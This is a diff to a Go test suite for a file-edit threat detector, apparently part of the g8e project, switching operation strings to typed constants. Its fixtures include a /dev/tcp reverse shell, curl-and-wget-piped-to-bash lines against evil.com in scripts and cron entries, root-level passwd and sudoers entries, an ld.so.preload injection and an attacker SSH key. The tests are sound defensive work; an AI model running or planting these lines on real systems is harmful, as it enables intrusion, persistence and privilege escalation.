@@ -17,10 +17,10 @@ import (
 	"regexp"
 	"testing"
 
+	"github.com/g8e-ai/g8e/services/g8eo/internal/constants"
+	"github.com/g8e-ai/g8e/services/g8eo/internal/testutil"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
-
-	"github.com/g8e-ai/g8e/services/g8eo/internal/testutil"
 )
 
 func newTestSentinelWithThreatDetection(t *testing.T) *Sentinel {
@@ -537,7 +537,7 @@ func TestSentinel_AnalyzeFileEdit_CriticalFiles(t *testing.T) {
 
 	for _, path := range criticalFiles {
 		t.Run(path, func(t *testing.T) {
-			result := sentinel.AnalyzeFileEdit(path, "write", "some content")
+			result := sentinel.AnalyzeFileEdit(path, constants.FileOperationWrite, "some content")
 			require.NotNil(t, result)
 			assert.True(t, result.IsCriticalSystemFile, "Should be critical: %s", path)
 		})
@@ -550,14 +550,14 @@ func TestSentinel_AnalyzeFileEdit_BlockedOperations(t *testing.T) {
 	tests := []struct {
 		name      string
 		path      string
-		operation string
+		operation constants.FileOperation
 		content   string
 	}{
-		{"write passwd", "/etc/passwd", "write", "attacker:x:0:0::/root:/bin/bash"},
-		{"write shadow", "/etc/shadow", "write", "attacker:$6$salt$hash:19000:0:99999:7:::"},
-		{"write sudoers", "/etc/sudoers", "write", "ALL ALL=(ALL) NOPASSWD: ALL"},
-		{"write ld preload", "/etc/ld.so.preload", "write", "/tmp/evil.so"},
-		{"delete log", "/var/log/auth.log", "delete", ""},
+		{"write passwd", "/etc/passwd", constants.FileOperationWrite, "attacker:x:0:0::/root:/bin/bash"},
+		{"write shadow", "/etc/shadow", constants.FileOperationWrite, "attacker:$6$salt$hash:19000:0:99999:7:::"},
+		{"write sudoers", "/etc/sudoers", constants.FileOperationWrite, "ALL ALL=(ALL) NOPASSWD: ALL"},
+		{"write ld preload", "/etc/ld.so.preload", constants.FileOperationWrite, "/tmp/evil.so"},
+		{"delete log", "/var/log/auth.log", constants.FileOperationDelete, ""},
 	}
 
 	for _, tt := range tests {
@@ -577,7 +577,7 @@ func TestSentinel_AnalyzeFileEdit_ContentAnalysis(t *testing.T) {
 		content := `#!/bin/bash
 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
 `
-		result := sentinel.AnalyzeFileEdit("/tmp/script.sh", "write", content)
+		result := sentinel.AnalyzeFileEdit("/tmp/script.sh", constants.FileOperationWrite, content)
 		require.NotNil(t, result)
 		assert.False(t, result.Safe)
 		assert.Greater(t, len(result.ThreatSignals), 0)
@@ -585,7 +585,7 @@ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
 
 	t.Run("ssh key injection", func(t *testing.T) {
 		content := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@evil.com"
-		result := sentinel.AnalyzeFileEdit("/home/user/.ssh/authorized_keys", "write", content)
+		result := sentinel.AnalyzeFileEdit("/home/user/.ssh/authorized_keys", constants.FileOperationWrite, content)
 		require.NotNil(t, result)
 		assert.Greater(t, len(result.ThreatSignals), 0)
 
@@ -601,7 +601,7 @@ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
 
 	t.Run("cron with remote download", func(t *testing.T) {
 		content := "* * * * * curl https://evil.com/update.sh | bash"
-		result := sentinel.AnalyzeFileEdit("/etc/cron.d/malicious", "write", content)
+		result := sentinel.AnalyzeFileEdit("/etc/cron.d/malicious", constants.FileOperationWrite, content)
 		require.NotNil(t, result)
 		assert.Greater(t, len(result.ThreatSignals), 0)
 
@@ -622,7 +622,7 @@ Description=Evil Service
 ExecStart=/tmp/evil
 [Install]
 WantedBy=multi-user.target`
-		result := sentinel.AnalyzeFileEdit("/etc/systemd/system/evil.service", "write", content)
+		result := sentinel.AnalyzeFileEdit("/etc/systemd/system/evil.service", constants.FileOperationWrite, content)
 		require.NotNil(t, result)
 		assert.Greater(t, len(result.ThreatSignals), 0)
 	})
@@ -633,14 +633,14 @@ func TestSentinel_AnalyzeFileEdit_SafeOperations(t *testing.T) {
 
 	safeOps := []struct {
 		path      string
-		operation string
+		operation constants.FileOperation
 		content   string
 	}{
-		{"/home/user/notes.txt", "write", "My notes here"},
-		{"/var/www/html/index.html", "write", "<html><body>Hello</body></html>"},
-		{"/opt/myapp/config.json", "write", `{"debug": true}`},
-		{"/tmp/test.txt", "read", ""},
-		{"/home/user/script.py", "write", "print('Hello World')"},
+		{"/home/user/notes.txt", constants.FileOperationWrite, "My notes here"},
+		{"/var/www/html/index.html", constants.FileOperationWrite, "<html><body>Hello</body></html>"},
+		{"/opt/myapp/config.json", constants.FileOperationWrite, `{"debug": true}`},
+		{"/tmp/test.txt", constants.FileOperationRead, ""},
+		{"/home/user/script.py", constants.FileOperationWrite, "print('Hello World')"},
 	}
 
 	for _, op := range safeOps {
@@ -660,7 +660,7 @@ func TestSentinel_AnalyzeFileEdit_ThreatDetectionDisabled(t *testing.T) {
 	}
 	sentinel := NewSentinel(config, testutil.NewTestLogger())
 
-	result := sentinel.AnalyzeFileEdit("/etc/passwd", "write", "attacker:x:0:0::/root:/bin/bash")
+	result := sentinel.AnalyzeFileEdit("/etc/passwd", constants.FileOperationWrite, "attacker:x:0:0::/root:/bin/bash")
 	require.NotNil(t, result)
 	assert.True(t, result.Safe, "Should be safe when threat detection disabled")
 	assert.Empty(t, result.ThreatSignals)
@@ -1057,7 +1057,7 @@ func TestSentinel_AnalyzeFileEdit_ReadVsWrite(t *testing.T) {
 	sentinel := newTestSentinelWithThreatDetection(t)
 
 	t.Run("read operation on auth files is not blocked by path analysis", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/etc/passwd", "read", "")
+		result := sentinel.AnalyzeFileEdit("/etc/passwd", constants.FileOperationRead, "")
 		require.NotNil(t, result)
 		assert.True(t, result.IsCriticalSystemFile)
 		// Read on critical files should require approval, not be blocked
@@ -1071,7 +1071,7 @@ func TestSentinel_AnalyzeFileEdit_ReadVsWrite(t *testing.T) {
 	})
 
 	t.Run("write operation on /etc/passwd is blocked", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/etc/passwd", "write", "evil content")
+		result := sentinel.AnalyzeFileEdit("/etc/passwd", constants.FileOperationWrite, "evil content")
 		require.NotNil(t, result)
 		assert.False(t, result.Safe)
 		assert.True(t, result.IsCriticalSystemFile)
@@ -1088,25 +1088,25 @@ func TestSentinel_AnalyzeFileEdit_ReadVsWrite(t *testing.T) {
 	})
 
 	t.Run("write to /etc/shadow is blocked", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/etc/shadow", "write", "attacker:$6$hash")
+		result := sentinel.AnalyzeFileEdit("/etc/shadow", constants.FileOperationWrite, "attacker:$6$hash")
 		require.NotNil(t, result)
 		assert.False(t, result.Safe)
 	})
 
 	t.Run("write to /etc/group is blocked", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/etc/group", "write", "root:x:0:attacker")
+		result := sentinel.AnalyzeFileEdit("/etc/group", constants.FileOperationWrite, "root:x:0:attacker")
 		require.NotNil(t, result)
 		assert.False(t, result.Safe)
 	})
 
 	t.Run("write to /etc/gshadow is blocked", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/etc/gshadow", "write", "root:::attacker")
+		result := sentinel.AnalyzeFileEdit("/etc/gshadow", constants.FileOperationWrite, "root:::attacker")
 		require.NotNil(t, result)
 		assert.False(t, result.Safe)
 	})
 
 	t.Run("write to sudoers is blocked", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/etc/sudoers.d/custom", "write", "attacker ALL=(ALL) NOPASSWD: ALL")
+		result := sentinel.AnalyzeFileEdit("/etc/sudoers.d/custom", constants.FileOperationWrite, "attacker ALL=(ALL) NOPASSWD: ALL")
 		require.NotNil(t, result)
 		assert.False(t, result.Safe)
 
@@ -1121,7 +1121,7 @@ func TestSentinel_AnalyzeFileEdit_ReadVsWrite(t *testing.T) {
 	})
 
 	t.Run("write to ld.so.preload is blocked", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/etc/ld.so.preload", "write", "/tmp/evil.so")
+		result := sentinel.AnalyzeFileEdit("/etc/ld.so.preload", constants.FileOperationWrite, "/tmp/evil.so")
 		require.NotNil(t, result)
 		assert.False(t, result.Safe)
 
@@ -1136,7 +1136,7 @@ func TestSentinel_AnalyzeFileEdit_ReadVsWrite(t *testing.T) {
 	})
 
 	t.Run("delete log file is blocked", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/var/log/secure", "delete", "")
+		result := sentinel.AnalyzeFileEdit("/var/log/secure", constants.FileOperationDelete, "")
 		require.NotNil(t, result)
 		assert.False(t, result.Safe)
 
@@ -1151,7 +1151,7 @@ func TestSentinel_AnalyzeFileEdit_ReadVsWrite(t *testing.T) {
 	})
 
 	t.Run("read of log file is safe", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/var/log/syslog", "read", "")
+		result := sentinel.AnalyzeFileEdit("/var/log/syslog", constants.FileOperationRead, "")
 		require.NotNil(t, result)
 		assert.True(t, result.Safe)
 	})
@@ -1164,7 +1164,7 @@ func TestSentinel_AnalyzeFileEdit_ContentAnalysis_ShellScripts(t *testing.T) {
 		content := `#!/usr/bin/env bash
 curl https://evil.com/payload.sh | bash
 `
-		result := sentinel.AnalyzeFileEdit("/tmp/setup.sh", "write", content)
+		result := sentinel.AnalyzeFileEdit("/tmp/setup.sh", constants.FileOperationWrite, content)
 		require.NotNil(t, result)
 		assert.False(t, result.Safe)
 		assert.Greater(t, len(result.ThreatSignals), 0)
@@ -1175,7 +1175,7 @@ curl https://evil.com/payload.sh | bash
 echo "Hello, World"
 ls -la /tmp
 `
-		result := sentinel.AnalyzeFileEdit("/tmp/safe.sh", "write", content)
+		result := sentinel.AnalyzeFileEdit("/tmp/safe.sh", constants.FileOperationWrite, content)
 		require.NotNil(t, result)
 		assert.True(t, result.Safe)
 	})
@@ -1184,7 +1184,7 @@ ls -la /tmp
 		// Content has dangerous pattern but no shebang, so shell-specific detection skips it
 		content := `This is documentation about reverse shells:
 The command bash -i >& /dev/tcp/attacker/4444 is dangerous.`
-		result := sentinel.AnalyzeFileEdit("/tmp/notes.md", "write", content)
+		result := sentinel.AnalyzeFileEdit("/tmp/notes.md", constants.FileOperationWrite, content)
 		require.NotNil(t, result)
 		// Should be safe since no shebang means content isn't treated as a script
 		assert.True(t, result.Safe)
@@ -1192,7 +1192,7 @@ The command bash -i >& /dev/tcp/attacker/4444 is dangerous.`
 
 	t.Run("cron file with wget triggers persistence detection", func(t *testing.T) {
 		content := "0 * * * * wget https://evil.com/update.sh -O /tmp/update.sh && bash /tmp/update.sh"
-		result := sentinel.AnalyzeFileEdit("/etc/cron.d/update", "write", content)
+		result := sentinel.AnalyzeFileEdit("/etc/cron.d/update", constants.FileOperationWrite, content)
 		require.NotNil(t, result)
 
 		foundCron := false
@@ -1357,7 +1357,7 @@ func TestSentinel_AnalyzeFileEdit_CriticalSystemFileApproval(t *testing.T) {
 
 	t.Run("critical file that is safe still requires approval", func(t *testing.T) {
 		// Reading /etc/hosts - critical file but read operation is not blocked
-		result := sentinel.AnalyzeFileEdit("/etc/hosts", "read", "")
+		result := sentinel.AnalyzeFileEdit("/etc/hosts", constants.FileOperationRead, "")
 		require.NotNil(t, result)
 		assert.True(t, result.IsCriticalSystemFile)
 		// Should require approval even when safe
@@ -1368,7 +1368,7 @@ func TestSentinel_AnalyzeFileEdit_CriticalSystemFileApproval(t *testing.T) {
 	})
 
 	t.Run("non-critical file does not require approval when safe", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/home/user/test.txt", "write", "hello")
+		result := sentinel.AnalyzeFileEdit("/home/user/test.txt", constants.FileOperationWrite, "hello")
 		require.NotNil(t, result)
 		assert.False(t, result.IsCriticalSystemFile)
 		assert.True(t, result.Safe)
@@ -1485,16 +1485,23 @@ func TestSentinel_AnalyzeFileEdit_ResultFieldsAreCorrect(t *testing.T) {
 	sentinel := newTestSentinelWithThreatDetection(t)
 
 	t.Run("file path is preserved in result FilePath field", func(t *testing.T) {
-		result := sentinel.AnalyzeFileEdit("/etc/passwd", "read", "")
+		result := sentinel.AnalyzeFileEdit("/etc/passwd", constants.FileOperationRead, "")
 		require.NotNil(t, result)
 		assert.Equal(t, "/etc/passwd", result.FilePath)
 	})
 
 	t.Run("operation is echoed correctly in result Operation field", func(t *testing.T) {
-		for _, op := range []string{"read", "write", "create", "delete", "replace", "patch"} {
+		for _, op := range []constants.FileOperation{
+			constants.FileOperationRead,
+			constants.FileOperationWrite,
+			constants.FileOperationCreate,
+			constants.FileOperationDelete,
+			constants.FileOperationReplace,
+			constants.FileOperationPatch,
+		} {
 			result := sentinel.AnalyzeFileEdit("/tmp/test.txt", op, "")
 			require.NotNil(t, result)
-			assert.Equal(t, op, result.Operation, "Operation field must echo the input operation: %s", op)
+			assert.Equal(t, string(op), result.Operation, "Operation field must echo the input operation: %s", op)
 		}
 	})
 }
@@ -1518,7 +1525,7 @@ func TestSentinel_AnalyzeFileEdit_SentinelEnabledFalse(t *testing.T) {
 	}
 	sentinel := NewSentinel(config, testutil.NewTestLogger())
 
-	result := sentinel.AnalyzeFileEdit("/etc/passwd", "write", "content")
+	result := sentinel.AnalyzeFileEdit("/etc/passwd", constants.FileOperationWrite, "content")
 	require.NotNil(t, result)
 	assert.Equal(t, "[OUTPUT_SUPPRESSED]", result.FilePath, "FilePath field must be suppressed when Enabled=false")
 	assert.True(t, result.Safe)
@@ -1558,12 +1565,17 @@ func TestSentinel_AnalyzeFileEdit_WriteCreateReplaceOnAuthFilesBlocked(t *testin
 	sentinel := newTestSentinelWithThreatDetection(t)
 
 	authFiles := []string{"/etc/passwd", "/etc/shadow", "/etc/group", "/etc/gshadow"}
-	writeOps := []string{"write", "create", "replace", "patch"}
+	writeOps := []constants.FileOperation{
+		constants.FileOperationWrite,
+		constants.FileOperationCreate,
+		constants.FileOperationReplace,
+		constants.FileOperationPatch,
+	}
 
 	for _, path := range authFiles {
 		for _, op := range writeOps {
 			path, op := path, op
-			t.Run(path+"_"+op, func(t *testing.T) {
+			t.Run(path+"_"+string(op), func(t *testing.T) {
 				result := sentinel.AnalyzeFileEdit(path, op, "malicious content")
 				require.NotNil(t, result)
 				assert.False(t, result.Safe, "Operation %s on %s must be blocked", op, path)
@@ -1671,7 +1683,7 @@ func TestSentinel_AnalyzeFileEdit_ThreatDetectionDisabledPreservesCriticalFileFl
 	}
 	sentinel := NewSentinel(config, testutil.NewTestLogger())
 
-	result := sentinel.AnalyzeFileEdit("/etc/passwd", "write", "content")
+	result := sentinel.AnalyzeFileEdit("/etc/passwd", constants.FileOperationWrite, "content")
 	require.NotNil(t, result)
 	assert.True(t, result.Safe)
 	assert.Empty(t, result.ThreatSignals)
